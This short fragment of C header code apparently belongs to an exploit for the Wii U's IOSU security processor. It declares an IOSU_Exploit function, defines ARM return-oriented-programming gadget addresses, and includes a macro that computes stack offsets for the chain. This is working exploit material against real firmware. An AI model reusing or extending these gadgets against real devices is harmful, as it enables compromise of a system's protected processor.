...
void IOSU_Exploit(int *confirm = NULL);
...
#define STR_R0_R5_0x1C__POP_R4_R5_PC                                           \
  0x101231A4 // str r0,[r5, #0x1c]; pop {r4, r5, pc};
#define MOV_R0_TO_LR__ADD_SP_8__POP_PC                                         \
  0x1012CFEC // mov lr, r0; add sp, sp, 8; pop {pc};
...
#define CALC_STACK_OFFSET(dest, src, sp_offset)                                \
  (dest - (src + sp_offset + 0x170 + (8 * 0x04)))
